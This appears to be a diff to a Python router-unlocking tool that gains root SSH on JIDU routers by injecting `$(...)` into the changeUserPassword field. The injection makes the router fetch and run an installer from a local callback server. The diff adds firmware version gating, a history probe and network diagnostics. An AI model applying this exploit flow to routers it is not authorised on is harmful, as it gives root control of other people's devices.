@@ -32,7 +32,9 @@ from __future__ import annotations
 import argparse
 import contextlib
 import dataclasses
+import errno
 import http.server
+import ipaddress
 import json
 import os
 import re
@@ -81,6 +83,10 @@ QUALCOMM = {"JIDU6111", "JIDU6411", "JIDU6611", "JIDU6811", "JIDU6911"}
 
 class IduError(RuntimeError):
     """Anything that should stop the run with a readable message."""
+
+
+class UnsupportedFirmware(IduError):
+    """The firmware cannot run this exploit; stop instead of retrying payloads."""
 
 
 # --------------------------------------------------------------------------- #
@@ -321,6 +327,13 @@ class Injector:
     def execute(self, path: str = STAGING_PATH) -> str:
         return self.encode(f"sh {path}")
 
+    def literal(self, length: int = 16) -> str:
+        """A random password with no shell metacharacters, for the history probe."""
+        alphabet = string.ascii_letters + string.digits
+        body = "".join(secrets.choice(alphabet)
+                       for _ in range(max(0, length - len(self.salt))))
+        return (self.salt + body)[:PASSWORD_MAX]
+
 
 # --------------------------------------------------------------------------- #
 # serving the installer
@@ -356,6 +369,70 @@ class _Beacon(http.server.BaseHTTPRequestHandler):
         pass
 
 
+def _running_in_wsl() -> bool:
+    """True inside a WSL1/WSL2 distro. WSL2 NAT cannot receive LAN callbacks."""
+    if not sys.platform.startswith("linux"):
+        return False
+    if os.environ.get("WSL_DISTRO_NAME"):
+        return True
+    try:
+        with open("/proc/version", encoding="utf-8", errors="replace") as handle:
+            return "microsoft" in handle.read().lower()
+    except OSError:
+        return False
+
+
+def _port_error(port: int, problem: OSError) -> IduError:
+    """Turn a bind failure into the actual fix, not a generic 'port is busy'.
+
+    Two failures look alike but have different answers: EACCES on Linux means
+    the port is privileged (port 80 needs root), while EADDRINUSE means another
+    process holds it. The old message sent every Linux user to ``lsof``.
+    """
+    in_use = problem.errno in (errno.EADDRINUSE, 10048)      # 10048 = WSAEADDRINUSE
+    denied = problem.errno in (errno.EACCES, 10013)         # 10013 = WSAEACCES
+
+    if os.name == "nt":
+        holder = f"netstat -ano | findstr :{port}"
+        if denied:
+            return IduError(
+                f"cannot listen on port {port}: permission denied.\n"
+                "    Windows is refusing the bind. Run PowerShell as Administrator,\n"
+                "    and check that another program is not holding the port.\n"
+                f"    Find the holder with:  {holder}")
+        if in_use:
+            return IduError(
+                f"cannot listen on port {port}: already in use.\n"
+                "    The router has to fetch the installer from us, so that port must\n"
+                f"    be free.\n    Find the holder with:  {holder}")
+        return IduError(f"cannot listen on port {port}: {problem}\n"
+                        f"    Find the holder with:  {holder}")
+
+    if denied:
+        hint = (
+            "    Port 80 is privileged on Linux, so binding it needs root.\n"
+            "    Re-run the command with sudo, for example:\n"
+            "      sudo ./flash.sh unlock\n"
+            "    Or allow unprivileged low ports until the next reboot:\n"
+            "      sudo sysctl net.ipv4.ip_unprivileged_port_start=80")
+        if _running_in_wsl():
+            hint += (
+                "\n    WSL2's default NAT also stops the router reaching the VM. If the\n"
+                "    callback address starts with 172., run .\\flash.ps1 natively on\n"
+                "    Windows (or use Git Bash), or enable mirrored networking in\n"
+                "    %UserProfile%\\.wslconfig.")
+        return IduError(f"cannot listen on port {port}: permission denied.\n{hint}")
+
+    if in_use:
+        return IduError(
+            f"cannot listen on port {port}: already in use.\n"
+            "    The router has to fetch the installer from us, so that port must be\n"
+            "    free.\n"
+            f"    Find the holder with:  lsof -nP -iTCP:{port} -sTCP:LISTEN")
+
+    return IduError(f"cannot listen on port {port}: {problem}")
+
+
 class Callback:
     """Tiny HTTP server the router fetches the installer from."""
 
@@ -370,15 +447,7 @@ class Callback:
         try:
             self.server = socketserver.TCPServer(("0.0.0.0", port), _Beacon)
         except OSError as problem:
-            if os.name == "nt":
-                holder = f"netstat -ano | findstr :{port}"
-            else:
-                holder = f"lsof -nP -iTCP:{port} -sTCP:LISTEN"
-            raise IduError(
-                f"cannot listen on port {port}: {problem}\n"
-                f"    The router has to fetch the installer from us, so that port must "
-                f"be free.\n    Find the holder with:  {holder}"
-            ) from problem
+            raise _port_error(port, problem) from problem
         self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
 
     def __enter__(self):
@@ -401,6 +470,46 @@ def address_reaching(host: str) -> str:
         return probe.getsockname()[0]
     finally:
         probe.close()
+
+
+def callback_address(host: str, override: str | None = None) -> str:
+    """The address to put in the payload, with the impossible cases caught early.
+
+    ``address_reaching`` returns the source address for the route to the router,
+    which is normally the LAN address. A VPN or WSL2's NAT can make that a
+    private address the router cannot dial; the unlock then waits a minute for a
+    callback that can never arrive. Fail with the fix instead.
+    """
+    address = override or address_reaching(host)
+    try:
+        local = ipaddress.ip_address(address)
+    except ValueError as problem:
+        raise IduError(f"--address {address!r} is not an IP address") from problem
+    if not isinstance(local, ipaddress.IPv4Address):
+        raise IduError(f"the callback address must be IPv4, not {address}")
+    if local.is_loopback or local.is_unspecified or local.is_multicast:
+        raise IduError(
+            f"the callback address is {address}, which the router cannot reach.\n"
+            "    Pass --address with this computer's LAN address.")
+
+    # WSL2's default NAT puts the distro on 172.16.0.0/12 while the router is on
+    # the Windows LAN. The router can reach Windows, not the VM behind it.
+    if (_running_in_wsl()
+            and local in ipaddress.ip_network("172.16.0.0/12")):
+        try:
+            router = ipaddress.ip_address(socket.gethostbyname(host))
+        except (OSError, ValueError):
+            router = None
+        if router is None or router not in ipaddress.ip_network("172.16.0.0/12"):
+            raise IduError(
+                f"the callback address is {address}, a WSL2 NAT address that the "
+                f"router at {host} cannot reach.\n"
+                "    Run .\\flash.ps1 natively on Windows (recommended), or use Git Bash.\n"
+                "    If you need WSL, enable mirrored networking in "
+                "%UserProfile%\\.wslconfig\n"
+                "    and allow Python through Windows Firewall; or set up a port proxy\n"
+                "    and pass --address with the Windows LAN address.")
+    return address
 
 
 # --------------------------------------------------------------------------- #
@@ -574,19 +683,62 @@ class Vector:
 
 
 class PasswordVector(Vector):
-    """Injection through changeUserPassword — the original bug (<= R2.0.19.5).
+    """Injection through changeUserPassword.
 
-    The hashing helper shelled out with the password interpolated, and the
-    field validates 8..32 chars while permitting `$`, `(`, `)`, `{`, `}` and
-    `${IFS}`. It rejects `|`, so the installer arrives in two steps: fetch it
-    into a staging file, then run that file.
+    The vulnerable shell-out is the password-history hash, not the passwd call:
+    the handler interpolates the new password into a double-quoted command, so
+    `$(...)` runs as root. The field validates 8..32 chars and permits `$`,
+    `(`, `)`, `{`, `}` and `${IFS}`, but rejects `|`, so the installer arrives
+    in two steps: fetch it into a staging file, then run that file.
+
+    Older builds (R2.0.18.2 and earlier) have no password-history function and
+    wrap the password in single quotes, so the payload is inert. `execute`
+    probes for password history first and stops with an explanation instead of
+    waiting a minute for a callback that can never arrive.
     """
 
-    name = "changeUserPassword (password field, ~R2.x)"
+    name = "changeUserPassword (password-history hash)"
+
+    def __init__(self, force: bool = False):
+        self.force = force
 
     def execute(self, api: Api, address: str) -> None:
         guest = api.guest_record()
         print(f"    targeting guest record {guest.get('recordId')}")
+
+        # A literal password change is a safe probe. On a build with
+        # savePasswdHistory() it replaces the history string (appending a hash,
+        # or dropping the oldest when full); on the builds examined, an older
+        # build never touches it, which is the signal this tool uses to stop
+        # before sending a payload.
+        before = guest.get("passwdHistory") or ""
+        print("    probing for password-history support ...")
+        reply = api.set_password(guest["recordId"], Injector().literal())
+        if not Api._ok(reply):
+            raise IduError(f"history probe rejected: {reply.get('code')} "
+                            f"{reply.get('message', '')}")
+        guest = api.guest_record()
+        after = guest.get("passwdHistory") or ""
+        if after and after != before:
+            print("    password-history shell-out present")
+        elif self.force:
+            print("    warning: no password history recorded; forcing the "
+                  "payloads anyway")
+        else:
+            raise UnsupportedFirmware(
+                "this build does not record password history, so the "
+                "changeUserPassword API cannot be injected.\n"
+                "    The handler accepted a literal password but added no new "
+                "history entry.\n"
+                "    On the builds examined, that also means this handler's "
+                "vulnerable\n"
+                "    shell-out is absent. Builds before R2.0.19 behave this "
+                "way. The guest\n"
+                "    password changed, but nothing else was touched. Pass "
+                "--force to send\n"
+                "    the payloads anyway; this tool's fallback is the "
+                "u-boot/UART console.")
+
         injector = Injector()
         for label, payload in (("fetch", injector.download(address)),
                                ("run", injector.execute())):
@@ -607,10 +759,11 @@ class Verdict:
     vectors: list
     evidence: list
     test_required: bool = False
+    method_closed: bool = False
 
     @property
     def unlockable(self) -> bool:
-        return bool(self.vectors) and not self.test_required
+        return bool(self.vectors) and not self.test_required and not self.method_closed
 
 
 def firmware_version(api: Api) -> str:
@@ -633,6 +786,26 @@ def _release(version: str) -> tuple | None:
 PASSWORD_CUTOFF = {"mediatek": (3, 2, 0), "qualcomm": (3, 2, 6)}
 DEFAULT_CUTOFF = (3, 2, 0)
 
+# The exploit is the password-history hash, not the passwd call. A stock
+# JIDU6801 R2.0.18.2 rootfs has no savePasswdHistory() at all: its setPassword()
+# wraps the password in single quotes, so `$(...)` stays literal and the API
+# just accepts an ordinary password. R2.0.19.6 is the oldest rootfs confirmed
+# to carry the vulnerable double-quoted hash. Everything below R2.0.19 is
+# therefore treated as closed for changeUserPassword; the 19.x builds before
+# 19.6 are an unknown window.
+PASSWORD_FLOOR = {"mediatek": (2, 0, 19)}
+PASSWORD_CONFIRMED = {"mediatek": (2, 0, 19, 6)}
+
+# The vendor fixed the handler by R3.2.3 on MTK: it now uses
+# luci.sys.user.setpasswd instead of a shell-out.
+PASSWORD_FIXED = {"mediatek": (3, 2, 3)}
+
+
+def _at_least(release: tuple, floor: tuple) -> bool:
+    width = max(len(release), len(floor))
+    return (release + (0,) * (width - len(release))
+            >= floor + (0,) * (width - len(floor)))
+
 
 def _supported_release(release: tuple, family: str | None = None) -> bool:
     cutoff = PASSWORD_CUTOFF.get(family, DEFAULT_CUTOFF)
@@ -645,8 +818,10 @@ def check(api: Api) -> Verdict:
     """Decide whether a unit can be unlocked — WITHOUT changing anything.
 
     A read-only probe: the firmware release sets the expectation for the
-    changeUserPassword handler (cutoff differs by family — see
-    PASSWORD_CUTOFF), but the version is only a compatibility hint.
+    changeUserPassword handler (the vulnerable window differs by family — see
+    PASSWORD_CUTOFF, PASSWORD_FLOOR and PASSWORD_FIXED), but the version is
+    only a compatibility hint. `unlock` confirms it at runtime by probing for
+    password history before it sends a payload.
     """
     model = api.device.model if api.device else "?"
     version = firmware_version(api)
@@ -654,28 +829,56 @@ def check(api: Api) -> Verdict:
     family = api.device.family if api.device else None
     cutoff = PASSWORD_CUTOFF.get(family, DEFAULT_CUTOFF)
     label = f"R{'.'.join(str(part) for part in cutoff)}"
+    floor = PASSWORD_FLOOR.get(family)
+    confirmed = PASSWORD_CONFIRMED.get(family)
+    fixed = PASSWORD_FIXED.get(family)
+    floor_label = f"R{'.'.join(str(part) for part in floor)}" if floor else "?"
+    confirmed_label = (f"R{'.'.join(str(part) for part in confirmed)}"
+                       if confirmed else "?")
+    fixed_label = f"R{'.'.join(str(part) for part in fixed)}" if fixed else "?"
 
     evidence = [f"firmware {version or 'unknown'}"]
     vectors = []
+    method_closed = False
+    test_required = False
 
     if release is None:
         vectors.append(PasswordVector.name)
         evidence.append("unrecognised version string; test the API with unlock")
+        test_required = True
+    elif floor and not _at_least(release, floor):
+        method_closed = True
+        evidence.append(
+            f"release < {floor_label} on {family} boards: this build predates "
+            "the password-history shell-out (an R2.0.18.2 rootfs was checked), "
+            "so changeUserPassword is not injectable")
+    elif fixed and _at_least(release, fixed):
+        method_closed = True
+        evidence.append(
+            f"release >= {fixed_label} on {family} boards: the handler uses "
+            "luci.sys.user.setpasswd, so changeUserPassword is not injectable")
+    elif confirmed and not _at_least(release, confirmed):
+        vectors.append(PasswordVector.name)
+        evidence.append(
+            f"release {version} is between {floor_label} and {confirmed_label}: "
+            "the password-history feature landed in this window; test the API "
+            "with unlock")
         test_required = True
     elif _supported_release(release, family):
         vectors.append(PasswordVector.name)
         evidence.append(
             f"release <= {label} on {family or 'unknown'} boards: "
             "changeUserPassword is injectable")
-        test_required = False
     else:
         vectors.append(PasswordVector.name)
         evidence.append(
-            f"release > {label} on {family or 'unknown'} boards: test the API with unlock")
+            f"release > {label} on {family or 'unknown'} boards: test the API "
+            "with unlock")
         test_required = True
 
     return Verdict(model=model, firmware=version, vectors=vectors,
-                   evidence=evidence, test_required=test_required)
+                   evidence=evidence, test_required=test_required,
+                   method_closed=method_closed)
 
 
 def _shell_for(key: str | None, host: str) -> Shell:
@@ -699,13 +902,35 @@ def _ssh_hint(key: str | None, host: str) -> str:
 
 
 def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
-           patience: int = 900, hint: bool = True) -> None:
+           patience: int = 900, hint: bool = True,
+           address_override: str | None = None,
+           verdict: Verdict | None = None, force: bool = False) -> None:
     """Exploit the API to gain root SSH.
 
-    The firmware version is informational; the result of this API exploit is
-    authoritative. Nothing is generated here: with no --key the router is left
-    with passwordless root and nothing of ours installed on it.
+    The firmware version is a hint; the password-history probe inside the
+    vector is authoritative. Nothing is generated here: with no --key the
+    router is left with passwordless root and nothing of ours installed on it.
     """
+    # An already-unlocked unit needs no exploit. A unit set up through UART can
+    # still be backed up even when this firmware is outside the vulnerable
+    # window, and the wrappers run `unlock` before `backup`.
+    shell = _shell_for(key_path, api.host)
+    if shell.alive():
+        print("[+] Root SSH enabled")
+        if hint:
+            print(f"    {_ssh_hint(key_path, api.host)}")
+        return
+
+    if verdict and verdict.method_closed and not force:
+        detail = (verdict.evidence[0] if verdict.evidence
+                  else "the changeUserPassword method is closed on this firmware")
+        raise UnsupportedFirmware(
+            "this firmware cannot be unlocked with changeUserPassword:\n"
+            f"    {detail}\n"
+            "    Nothing was changed. This tool has no other network vector;\n"
+            "    the u-boot/UART console is its fallback.\n"
+            "    Pass --force to send the payloads anyway.")
+
     pubkey = None
     if key_path:
         pub_path = key_path + ".pub"
@@ -717,25 +942,23 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
         with open(pub_path) as handle:
             pubkey = handle.read().strip()
 
-    shell = _shell_for(key_path, api.host)
-    if shell.alive():
-        print("[+] Root SSH enabled")
-        if hint:
-            print(f"    {_ssh_hint(key_path, api.host)}")
-        return
-
-    address = address_reaching(api.host)
+    address = callback_address(api.host, address_override)
     script = installer_script(address, pubkey)
-    vectors: list[Vector] = [PasswordVector()]
+    vectors: list[Vector] = [PasswordVector(force=force)]
     total = len(vectors)
 
     print("[*] Unlocking...")
+    if hint:
+        print(f"[*] Callback: http://{address}:{port}/ "
+              "(the router fetches the installer here)")
     with Callback(script, port=port) as beacon:
         for number, vector in enumerate(vectors, start=1):
             seen = len(beacon.hits)
             try:
                 with api.session("admin", password, patience):
                     vector.execute(api, address)
+            except UnsupportedFirmware:
+                raise
             except IduError as problem:
                 print(f"    Method {number}/{total}: failed")
                 if VERBOSE:
@@ -749,8 +972,8 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
                     raise IduError(
                         "the installer ran but sshd never came up. Last beacon:\n"
                         f"    {beacon.hits[-1].replace(chr(10), chr(10) + '    ')}")
-                print(f"    Method {number}/{total}: failed (the router never "
-                      f"called back)")
+                print(f"    Method {number}/{total}: failed (the router accepted "
+                      f"the payloads but never fetched http://{address}:{port}/)")
                 continue
 
             print(f"    Method {number}/{total}: success")
@@ -765,9 +988,14 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
 
     raise IduError(
         "the changeUserPassword method did not land:\n"
-        "    The API exploit did not succeed — the password handler may be\n"
-        "    hardened, or the API locked down. The u-boot/UART console is then\n"
-        "    the remaining route.")
+        "    If the payloads were accepted, the router either did not execute\n"
+        "    them or could not reach this computer. Test the callback from\n"
+        f"    another device on the router's network: http://{address}:{port}/\n"
+        "    If that times out, a firewall is blocking it (on Windows, allow\n"
+        "    python on Private networks). If the address is wrong (VPN or\n"
+        "    multiple interfaces), pass --address with this computer's LAN\n"
+        "    address. The u-boot/UART console is this tool's fallback if the\n"
+        "    API itself is fixed.")
 
 
 # --------------------------------------------------------------------------- #
@@ -1079,6 +1307,9 @@ def main(argv: list | None = None) -> int:
                              "leaves root passwordless and installs nothing.")
     parser.add_argument("--patience", type=int, default=900,
                         help="seconds to wait for a free admin session")
+    parser.add_argument("--address", default=None,
+                        help="local IPv4 the router should fetch from "
+                             "(default: the route's source address)")
     # SUPPRESS, not False: an absent flag must not clobber the same option given
     # before the subcommand.
     parser.add_argument("--verbose", "-v", action="store_true",
@@ -1095,6 +1326,9 @@ def main(argv: list | None = None) -> int:
 
     unlock_p = subs.add_parser("unlock", help="gain root SSH and keep it")
     unlock_p.add_argument("--port", type=int, default=80, help="callback HTTP port")
+    unlock_p.add_argument("--force", action="store_true",
+                          help="send the payloads even when check says the method "
+                               "is closed")
     unlock_p.add_argument("--verbose", "-v", action="store_true",
                           default=argparse.SUPPRESS, help=argparse.SUPPRESS)
     unlock_p.add_argument("--no-banner", action="store_true",
@@ -1116,6 +1350,7 @@ def main(argv: list | None = None) -> int:
     # One session at a time: the backend permits a single admin login, so this
     # identifies the device and then releases the session before anything that
     # opens one of its own.
+    verdict = None
     with api.session("admin", args.password, args.patience) as device:
         if BANNER:
             print(f"[+] Device: {device.model} ({device.vendor} / {device.board})")
@@ -1133,20 +1368,32 @@ def main(argv: list | None = None) -> int:
                     "host": api.host, "model": verdict.model,
                     "firmware": verdict.firmware, "unlockable": verdict.unlockable,
                     "test_required": verdict.test_required,
+                    "method_closed": verdict.method_closed,
                     "vectors": verdict.vectors, "evidence": verdict.evidence,
                 }))
             else:
-                state = "TEST" if verdict.test_required else "YES"
+                state = ("NO" if verdict.method_closed
+                         else "TEST" if verdict.test_required else "YES")
                 print(f"[+] unlockable: {state}"
                       + (f"  via {', '.join(verdict.vectors)}"
                          if verdict.vectors else ""))
                 for line in verdict.evidence:
                     print(f"    - {line}")
+                if verdict.method_closed:
+                    print("    - this covers the changeUserPassword method only; "
+                          "no other handler is tested")
             return 0 if verdict.test_required or verdict.unlockable else 2
+
+        if args.command == "unlock":
+            # Carry the verdict out of this session so unlock() can refuse a
+            # closed method before it opens another session or touches the
+            # router. The runtime history probe remains the final authority.
+            verdict = check(api)
 
     if args.command == "unlock":
         unlock(api, args.key, args.password, port=args.port,
-               patience=args.patience)
+               patience=args.patience, address_override=args.address,
+               verdict=verdict, force=args.force)
         return 0
 
     if args.command == "backup":
